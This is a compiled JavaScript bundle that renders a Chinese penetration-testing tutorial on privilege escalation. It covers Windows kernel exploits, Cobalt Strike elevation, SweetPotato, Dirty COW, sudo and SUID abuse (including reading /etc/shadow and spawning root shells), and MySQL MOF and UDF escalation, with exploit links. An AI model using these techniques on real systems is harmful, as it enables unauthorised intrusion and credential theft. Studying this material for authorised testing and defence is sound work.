(window.webpackJsonp=window.webpackJsonp||[]).push([[61],{749:function(s,t,a){"use strict";a.r(t);var e=a(103),n=Object(e.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"提权的基础概念"}},[s._v("提权的基础概念 "),a("a",{staticClass:"header-anchor",attrs:{href:"#提权的基础概念"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("Windows上常见的权限分类：")])]),s._v(" "),a("blockquote",[a("p",[s._v("User：普通用户权限；")]),s._v(" "),a("p",[s._v("Administrator：管理员权限；")]),s._v(" "),a("p",[s._v("System：系统权限。")])]),s._v(" "),a("p",[a("strong",[s._v("Linux上权限分类：")])]),s._v(" "),a("blockquote",[a("p",[s._v("User：普通用户权限；")]),s._v(" "),a("p",[s._v("www-data：Web服务的权限，比User还要低，一般通过Web漏洞获取的Webshell就是这个权限；")]),s._v(" "),a("p",[s._v("root：Linux系统最高权限。")])]),s._v(" "),a("p",[a("strong",[s._v("纵向提权")]),s._v("：低权限角色获取高权限角色的权限。")]),s._v(" "),a("p",[a("strong",[s._v("横向提权")]),s._v("：在系统A中获取了系统B中同级别的角色权限。")]),s._v(" "),a("p",[a("strong",[s._v("常用的提权方法")]),s._v("：")]),s._v(" "),a("p",[s._v("系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权（利用率较高）。")]),s._v(" "),a("p",[s._v("利用windows系统错误配置提权（可信服务路径漏洞，组策略首选项等）")]),s._v(" "),a("h2",{attrs:{id:"windows提权"}},[s._v("Windows提权 "),a("a",{staticClass:"header-anchor",attrs:{href:"#windows提权"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("LOLBAS")]),s._v("（计划任务、文件传输、本地提权） https://lolbas-project.github.io/")]),s._v(" "),a("h3",{attrs:{id:"内核漏洞提权"}},[s._v("内核漏洞提权 "),a("a",{staticClass:"header-anchor",attrs:{href:"#内核漏洞提权"}},[s._v("#")])]),s._v(" "),a("table",[a("thead",[a("tr",[a("th",{staticStyle:{"text-align":"left"}},[s._v("漏洞代号")]),s._v(" "),a("th",{staticStyle:{"text-align":"left"}},[s._v("补丁编号")]),s._v(" "),a("th",{staticStyle:{"text-align":"left"}},[s._v("适用平台")]),s._v(" "),a("th",{staticStyle:{"text-align":"left"}},[s._v("用途")])])]),s._v(" "),a("tbody",[a("tr",[a("td",{staticStyle:{"text-align":"left"}},[s._v("MS14-058")]),s._v(" "),a("td",{staticStyle:{"text-align":"left"}},[s._v("KB3000061")]),s._v(" "),a("td",{staticStyle:{"text-align":"left"}},[s._v("03，08，12，Win7")]),s._v(" "),a("td",{staticStyle:{"text-align":"left"}},[s._v("本地提权")])]),s._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[s._v("MS14-068")]),s._v(" "),a("td",{staticStyle:{"text-align":"left"}},[s._v("KB3011780")]),s._v(" "),a("td",{staticStyle:{"text-align":"left"}},[s._v("域控未安装补丁的域内，03，08，12")]),s._v(" "),a("td",{staticStyle:{"text-align":"left"}},[s._v("域内提权")])]),s._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[s._v("MS15-051")]),s._v(" "),a("td",{staticStyle:{"text-align":"left"}},[s._v("KB3057191")]),s._v(" "),a("td",{staticStyle:{"text-align":"left"}},[s._v("03，08，12，Win7")]),s._v(" "),a("td",{staticStyle:{"text-align":"left"}},[s._v("本地提权")])]),s._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[s._v("MS16-032")]),s._v(" "),a("td",{staticStyle:{"text-align":"left"}},[s._v("KB3143141")]),s._v(" "),a("td",{staticStyle:{"text-align":"left"}},[s._v("08 r2以后，12，Win7")]),s._v(" "),a("td",{staticStyle:{"text-align":"left"}},[s._v("本地提权")])]),s._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[s._v("MS17-010")]),s._v(" "),a("td",{staticStyle:{"text-align":"left"}},[s._v("KB4013389")]),s._v(" "),a("td",{staticStyle:{"text-align":"left"}},[s._v("03，08，12，16，win7")]),s._v(" "),a("td",{staticStyle:{"text-align":"left"}},[s._v("远程注入dll")])]),s._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[s._v("CVE-2020-0787")]),s._v(" "),a("td",{staticStyle:{"text-align":"left"}}),s._v(" "),a("td",{staticStyle:{"text-align":"left"}},[s._v("all")]),s._v(" "),a("td",{staticStyle:{"text-align":"left"}},[s._v("windows全版本提权")])]),s._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[s._v("CVE-2020-1472")]),s._v(" "),a("td",{staticStyle:{"text-align":"left"}}),s._v(" "),a("td",{staticStyle:{"text-align":"left"}},[s._v("domain")]),s._v(" "),a("td",{staticStyle:{"text-align":"left"}},[s._v("域内提权")])])])]),s._v(" "),a("p",[a("strong",[s._v("快速检测目标系统未打漏洞补丁")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("systeminfo "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" temp.txt"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("for %i "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("KB3000061 KB3011780 KB3057191 KB3143141 KB4013389"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("do")]),s._v(" @type temp.txt"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("@find /i  "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"%i"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),s._v(" @echo %i Not Installed"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v("del /f /q /a temp.txt\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("补丁号根据自己需求加，利用MSF"),a("code",[s._v("中有相关EXP或者自行搜索 Github，searchsploit")])]),s._v(" "),a("p",[a("strong",[s._v("CVE-2020-0787")])]),s._v(" "),a("p",[s._v("直接下载EXP到目标主机上执行（需要上桌面，会弹出一个system权限的cmd窗口）")]),s._v(" "),a("p",[s._v("https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION")]),s._v(" "),a("p",[a("strong",[s._v("CVE-2020-1472")])]),s._v(" "),a("p",[s._v("POC：https://github.com/dirkjanm/CVE-2020-1472")]),s._v(" "),a("p",[s._v("Test-EXP：https://github.com/SecuraBV/CVE-2020-1472/")]),s._v(" "),a("p",[s._v("推荐把py打包成exe使用，虽然体积大点但是比装py环境方便")]),s._v(" "),a("h3",{attrs:{id:"利用cobalt-strike提权"}},[s._v("利用Cobalt Strike提权 "),a("a",{staticClass:"header-anchor",attrs:{href:"#利用cobalt-strike提权"}},[s._v("#")])]),s._v(" "),a("p",[s._v("Cobalt Strike 附带了一些绕过 "),a("code",[s._v("UAC")]),s._v(" 的攻击，但如果当前用户不是管理员(Administrator)， 攻击会失效。")]),s._v(" "),a("p",[s._v("Beacon默认回连时间（心跳时间）为60秒，为了更快的渗透修改成0秒，交互模式。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sleep")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("\t\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#心跳时间设快了容易被发现，实际攻击不建议设太快")]),s._v("\n\nshell "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("whoami")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[a("strong",[s._v("1、如果你有一个Administrator权限的Beacon，用以下命令提升到SYSTEM权限：")])]),s._v(" "),a("p",[s._v("这个需要创建服务")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("elevate svc-exe test1（你的监听器）\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("2、如果你是普通"),a("code",[s._v("本地")]),s._v("用户权限，用以下命令提升到高权限")])]),s._v(" "),a("p",[s._v("注意：如果是"),a("code",[s._v("域")]),s._v("用户会弹出认证窗口，不能提权")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("elevate uac-token-duplication test1\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("然后可以用上边的"),a("code",[s._v("svc-exe")]),s._v("再提权到SYSTEM")]),s._v(" "),a("h3",{attrs:{id:"c-版的烂土豆-来自qax零队"}},[s._v("C#版的烂土豆（来自QAX零队） "),a("a",{staticClass:"header-anchor",attrs:{href:"#c-版的烂土豆-来自qax零队"}},[s._v("#")])]),s._v(" "),a("p",[s._v("实测Win7、Win8、08、12等可用")]),s._v(" "),a("p",[s._v("项目地址：https://github.com/uknowsec/SweetPotato")]),s._v(" "),a("p",[s._v("直接在Webshell下执行")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("SweetPotato.exe -a "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("whoami")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"linux提权"}},[s._v("Linux提权 "),a("a",{staticClass:"header-anchor",attrs:{href:"#linux提权"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("GTFOBins")]),s._v("（sudo滥用和SUID提权命令查询）https://gtfobins.github.io/")]),s._v(" "),a("h3",{attrs:{id:"密码复用"}},[s._v("密码复用 "),a("a",{staticClass:"header-anchor",attrs:{href:"#密码复用"}},[s._v("#")])]),s._v(" "),a("p",[s._v("如数据库、后台 web 密码，可能就是 root 密码")]),s._v(" "),a("h3",{attrs:{id:"内核溢出漏洞提权"}},[s._v("内核溢出漏洞提权 "),a("a",{staticClass:"header-anchor",attrs:{href:"#内核溢出漏洞提权"}},[s._v("#")])]),s._v(" "),a("p",[s._v("1、信息收集")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("uname")]),s._v(" -a\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看系统版本内核信息")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#centos")]),s._v("\nhostnamectl\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看系统版本内核详细信息，推荐这个命令")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#ubuntu")]),s._v("\nlsb_release -a\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("2、使用 "),a("code",[s._v("searchsploit")]),s._v(" 查找相关内核漏洞")]),s._v(" "),a("p",[s._v("下载地址：https://github.com/offensive-security/exploitdb")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("searchsploit linux "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3.10")]),s._v(" CentOS Linux "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("7")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("例如经典的"),a("strong",[s._v("脏牛提权")]),s._v("~可以用Vulnhub的lampiao这个靶机去做实验")]),s._v(" "),a("p",[s._v("下载脏牛：https://github.com/gbonacini/CVE-2016-5195")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("./dcow -s\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("问题记录：")]),s._v(" "),a("p",[s._v("Win10子系统的 g++编译环境安装一直报错，最终发现 Ubuntu 20.04.1 LTS 版本跟apt源不匹配，使用最新的阿里源即可\n编译好后又报错cannot execute binary file: Exec format error，原因是系统版本和g++版本差异造成的，将源码上传到目标系统编译执行，成功执行")]),s._v(" "),a("h3",{attrs:{id:"sudo滥用"}},[s._v("sudo滥用 "),a("a",{staticClass:"header-anchor",attrs:{href:"#sudo滥用"}},[s._v("#")])]),s._v(" "),a("p",[a("code",[s._v("/etc/sudoers")]),s._v("文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" -l\t"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看当前用户可以sudo的程序")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("AWK：")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("awk")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'BEGIN {system(\"/bin/sh\")}'")]),s._v("\t\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#通过生成交互式系统外Shell来脱离受限环境，需要普通用户的密码")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("strong",[s._v("CURL：")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" file:///etc/shadow\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"suid提权"}},[s._v("SUID提权 "),a("a",{staticClass:"header-anchor",attrs:{href:"#suid提权"}},[s._v("#")])]),s._v(" "),a("p",[s._v("SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行")]),s._v(" "),a("p",[s._v("【ls 查看时有 s 属性才支持 SUID】")]),s._v(" "),a("p",[s._v("1、查找正在系统上运行的所有SUID可执行文件")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("find")]),s._v(" / -user root -perm -4000 -print "),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("2")]),s._v(">")]),s._v("/dev/null\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("2、比如发现了find")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#随便新建一个文件，或利用已有文件")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("touch")]),s._v(" abc\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#以SUID即root权限执行命令")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("find")]),s._v(" abc -exec whomai "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[s._v("3、例子 {nmap SUID提权}")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#2.02 to 5.21版本 用交互模式执行shell命令")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" nmap --interactive\t\t\nnmap"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("sh\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("h3",{attrs:{id:"su-root被禁止登录-获取交互shell"}},[s._v("su root被禁止登录（获取交互shell） "),a("a",{staticClass:"header-anchor",attrs:{href:"#su-root被禁止登录-获取交互shell"}},[s._v("#")])]),s._v(" "),a("blockquote",[a("p",[s._v("拿到 root 密码，端口转发，代理，但防火墙禁止其他人登录 root；")]),s._v(" "),a("p",[s._v("用原来的低权限 shell，也无法 sudo 切换 root")]),s._v(" "),a("p",[s._v("因为出于安全考虑，linux 要求用户必须从终端设备（tty）中输入密码，而不是标准输入（stdin）")]),s._v(" "),a("p",[s._v("所以 sudo 在你输入密码的时候本质上是读取了键盘，而不是读取 bash 里面输入的字符")])]),s._v(" "),a("p",[a("strong",[s._v("利用python获取交互Shell")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("python -c "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'import pty;pty.spawn(\"/bin/sh\")'")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("su")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("h2",{attrs:{id:"数据库提权"}},[s._v("数据库提权 "),a("a",{staticClass:"header-anchor",attrs:{href:"#数据库提权"}},[s._v("#")])]),s._v(" "),a("p",[s._v("以下数据库提权方法 "),a("code",[s._v("server 2003")]),s._v("之前的系统才可用")]),s._v(" "),a("h3",{attrs:{id:"mysql数据库提权"}},[s._v("MySQL数据库提权 "),a("a",{staticClass:"header-anchor",attrs:{href:"#mysql数据库提权"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("MOF提权")])]),s._v(" "),a("p",[s._v("MOF文件是mysql数据库的扩展文件（在c:/windows/system32/wbem/mof/nullevt.mof）")]),s._v(" "),a("p",[s._v("叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡")]),s._v(" "),a("p",[a("strong",[s._v("利用条件：")])]),s._v(" "),a("blockquote",[a("p",[a("code",[s._v("Windows<=2003")])]),s._v(" "),a("p",[s._v("mysql在c:/windows/system32/wbem/mof目录有写权限")]),s._v(" "),a("p",[s._v("已知数据库root账号密码")]),s._v(" "),a("p",[s._v("数据库允许外连")]),s._v(" "),a("p",[s._v("secure_file_priv为空")])]),s._v(" "),a("p",[s._v("当"),a("code",[s._v("secure_file_priv")]),s._v("的值没有具体值时，表示不对"),a("code",[s._v("MySQL")]),s._v("的导入|导出做限制，如果是null，表示"),a("code",[s._v("MySQL")]),s._v("不允许导入导出")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#查看secure_file_priv的值")]),s._v("\nSHOW VARIABLES LIKE "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"secure_file_priv"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#这个值可以在my.ini设置为空")]),s._v("\nsecure_file_priv "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("p",[a("strong",[s._v("提权原理：")])]),s._v(" "),a("blockquote",[a("p",[s._v("MOF文件既然每五秒就会执行，而且是系统权限；")]),s._v(" "),a("p",[s._v("我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件；")]),s._v(" "),a("p",[s._v("然后系统每隔五秒就会执行一次我们上传的MOF。")]),s._v(" "),a("p",[s._v("MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。")])]),s._v(" "),a("p",[s._v("这个提权方式条件非常严苛，数据库在system32写文件这个条件一般很难达到，而且较新的系统无法使用MOF提权。")]),s._v(" "),a("p",[a("strong",[s._v("MSF 下有Mof 提权模块")])]),s._v(" "),a("p",[s._v("执行成功后会直接反弹一个 "),a("code",[s._v("system")]),s._v("权限的meterpreter 。")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("use exploit/windows/mysql/mysql_mof\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h3",{attrs:{id:"udf提权"}},[s._v("UDF提权 "),a("a",{staticClass:"header-anchor",attrs:{href:"#udf提权"}},[s._v("#")])]),s._v(" "),a("p",[s._v("UDF(user-defined function)是MySQL的一个拓展接口，也可称之为"),a("strong",[s._v("用户自定义函数")])]),s._v(" "),a("p",[s._v("用户可以通过自己增加函数对mysql功能进行扩充，文件后缀为.dll")]),s._v(" "),a("p",[a("strong",[s._v("利用条件：")])]),s._v(" "),a("blockquote",[a("p",[a("code",[s._v("Server 2003、Windows XP、Windows 7")])]),s._v(" "),a("p",[s._v("已知mysql中root的账号密码")]),s._v(" "),a("p",[s._v("mysql版本 < 5.2 , UDF导出到系统目录c:/windows/system32/")]),s._v(" "),a("p",[s._v("mysql版本 > 5.2 ，UDF导出到安装路径MySQL\\Lib\\Plugin\\")]),s._v(" "),a("p",[s._v("secure_file_priv为空")])]),s._v(" "),a("p",[a("strong",[s._v("提权原理：")])]),s._v(" "),a("blockquote",[a("p",[s._v("利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)")]),s._v(" "),a("p",[s._v("当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。")]),s._v(" "),a("p",[s._v("这样我们自定义的函数才被当作本机函数执行。")]),s._v(" "),a("p",[s._v("在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而提权")])]),s._v(" "),a("p",[s._v("可以直接查询插件安装目录：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("show variables like %plugin%\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("如果plugin不存在，可以用NTFS ADS流来创建文件夹并导入dll")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#先找到Mysql的目录select @@basedir;")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#利用ADS流来创建plugin文件夹（测试并不能成功创建）select 'It is dll' into dumpfile 'C:\\\\phpStudy\\\\PHPTutorial\\\\MySQL\\\\lib\\\\plugin::$INDEX_ALLOCATION';")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("网上流传的是在数据库中直接就能利用ADS流创建plugin文件夹，但我测试发现直接导入文件可以，并不能创建文件夹。")]),s._v(" "),a("p",[s._v("但是利用ADS流确实能创建文件夹，如以下命令（可以自己测试一下）")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("123")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" test::"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$INDEX_ALLOCATION")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#这条命令会创建一个test文件夹")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("所以我是用"),a("code",[s._v("Webshell")]),s._v("这样创建的plugin文件夹：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("123")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" C:"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("phpStudy"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("PHPTutorial"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("MySQL"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("lib"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("plugin::"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$INDEX_ALLOCATION")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("有一个自动化工具")]),s._v("：https://github.com/T3st0r-Git/HackMySQL")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#上边的创建plugin目录步骤完成后直接利用即可")]),s._v("\npython root.py -a "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".2.9 -proot -e "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"whoami"')]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("strong",[s._v("通过WebShell上传udf.php（这种方法数据库不用外连也可以）")])]),s._v(" "),a("p",[s._v("udf.php：https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php")]),s._v(" 